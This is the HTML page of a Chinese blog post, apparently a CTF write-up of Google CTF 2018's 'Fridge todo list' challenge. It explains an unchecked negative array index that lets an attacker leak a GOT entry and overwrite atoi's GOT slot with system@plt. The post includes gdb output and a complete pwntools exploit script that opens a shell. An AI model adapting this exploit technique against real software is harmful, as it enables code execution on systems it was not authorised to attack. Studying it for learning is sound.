@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（十一） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（十一） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/790/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（十一）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2018-11-09 12:46"><i class="iconfont icon-date"></i>2018-11-09 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>本文是 plt 和 got 表相关的漏洞利用实例，是 <a href="https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/Fridge%20todo%20list">Google CTF</a> 中的一道题，题目给了源码和 binary。</p>
+
+<p>通过阅读代码，可以发现</p>
+
+<pre><code class="language-clike">int idx = read_int();
+if (idx &gt; TODO_COUNT) {
+    puts(OUT_OF_BOUNDS_MESSAGE);
+    return;
+}
+printf("What's your TODO? ");
+fflush(stdout);
+read_line(&amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
+</code></pre>
+
+<p>这里虽然检查了 <code class="highlighter-rouge">idx</code> 最大不能超过某个范围，但是没有检查小于零的情况，所以如果构造小于零的 <code class="highlighter-rouge">idx</code>，就可以读取比 <code class="highlighter-rouge">todos</code> 数组地址还小的位置的内存了，同理，在 <code class="highlighter-rouge">write_all</code> 函数中，也可以任意的去写这个位置的内存。</p>
+
+<p><code class="highlighter-rouge">todos</code> 是一个全局变量，所以它的内存地址是确定的，是在 bss 段。因为 <code class="highlighter-rouge">todos</code> 的索引会乘以 <code class="highlighter-rouge">TODO_LENGTH</code>，所以内存的读取是跳跃的，每次都相差 48 个字节。</p>
+
+<p>使用 gdb 调试，<code class="highlighter-rouge">set follow-fork-mode parent</code> 然后 <code class="highlighter-rouge">b main</code> <code class="highlighter-rouge">p &amp;todos</code> 可以看到内存地址。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p &amp;todos
+$1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
+</code></pre>
+</div>
+
+<p>在 IDA 中，也可以看到 <code class="highlighter-rouge">todos</code> 和 <code class="highlighter-rouge">got</code> 表距离也非常近，写一个小程序算一下</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/790/1.png" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">base</span> <span class="o">=</span> <span class="mh">0x203140</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span> <span class="o">-</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">48</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0x203140 -&gt; todos
+0x203110
+0x2030e0
+0x2030b0
+         0x203088（非整数倍） -&gt; atoi
+0x203080 -&gt; open
+0x203050 -&gt; strncat
+0x203020 -&gt; write
+0x202ff0
+0x202fc0
+0x202f90
+</code></pre>
+</div>
+
+<p>比如先读一下 <code class="highlighter-rouge">write</code> 的地址</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[-------------------------------------code-------------------------------------]
+   0x555555554900 &lt;puts@plt&gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
+   0x555555554906 &lt;puts@plt+6&gt;:	push   0x0
+   0x55555555490b &lt;puts@plt+11&gt;:	jmp    0x5555555548f0
+=&gt; 0x555555554910 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
+ | 0x555555554916 &lt;write@plt+6&gt;:	push   0x1
+ | 0x55555555491b &lt;write@plt+11&gt;:	jmp    0x5555555548f0
+ | 0x555555554920 &lt;strlen@plt&gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
+ | 0x555555554926 &lt;strlen@plt+6&gt;:	push   0x2
+ |-&gt;   0x555555554916 &lt;write@plt+6&gt;:	push   0x1
+       0x55555555491b &lt;write@plt+11&gt;:	jmp    0x5555555548f0
+       0x555555554920 &lt;strlen@plt&gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
+       0x555555554926 &lt;strlen@plt+6&gt;:	push   0x2
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+</code></pre>
+</div>
+
+<p>重新画一下数据分布图</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0x555555757140 -&gt; todos
+0x555555757110
+0x5555557570e0
+0x5555557570b0
+0x555555757080
+0x555555757050
+0x555555757020 =&gt; 0x555555554916 -&gt; write@plt+6
+</code></pre>
+</div>
+
+<p>由以前的知识就知道 <code class="highlighter-rouge">0x555555757020</code> 就是 <code class="highlighter-rouge">write</code> 的 got 表的地址，减去刚才已知的 <code class="highlighter-rouge">todos</code> 的位置，正好是 <code class="highlighter-rouge">(0x555555757020 - 0x555555757140) / 48 == -6</code>。</p>
+
+<p>可以先构造一个读取 <code class="highlighter-rouge">write</code> 的 got 表地址 exp</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span>
+
+<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./todo"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"admin</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"read?"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"-6</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"Hi admin,"</span><span class="p">)</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>其中 <code class="highlighter-rouge">&lt;Q</code> 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 <code class="highlighter-rouge">write</code> 还是指向 <code class="highlighter-rouge">write@plt+6</code> 的。</p>
+
+<p>剩下的步骤就简单多了，在 <code class="highlighter-rouge">store_todo</code> 函数中，可以将我们的输入写入 got 表的位置，所以应该是将 <code class="highlighter-rouge">system@plt</code> 的地址写入接下来要运行的参数可控的函数的 got 表的位置。发现 <code class="highlighter-rouge">atoi</code> 函数是一个选择，函数的偏移是确定的，<code class="highlighter-rouge">system@plt</code> - <code class="highlighter-rouge">write@plt+6</code> 也就是 <code class="highlighter-rouge">0x555555554940 - 0x555555554916 = 0x2a</code>（<code class="highlighter-rouge">atoi@plt</code> 的地址可以使用 <code class="highlighter-rouge">info addr atoi@plt</code> 获取，是在偏移 -4 再加 8 个字节）。</p>
+
+<p>完整 exp 如下</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span><span class="p">,</span> <span class="n">pack</span>
+
+<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./todo"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"admin</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"read?"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"-6</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"Hi admin,"</span><span class="p">)</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"entry?"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"-4</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"TODO?"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"AAAAAAAA"</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_addr</span> <span class="o">+</span> <span class="mh">0x2a</span><span class="p">)[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">proc</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<p>参考</p>
+
+<ul>
+  <li>https://hackso.me/google-ctf-beginners-quest-part-2/</li>
+</ul>
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（十一）&article_id=/index.php/archives/790/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
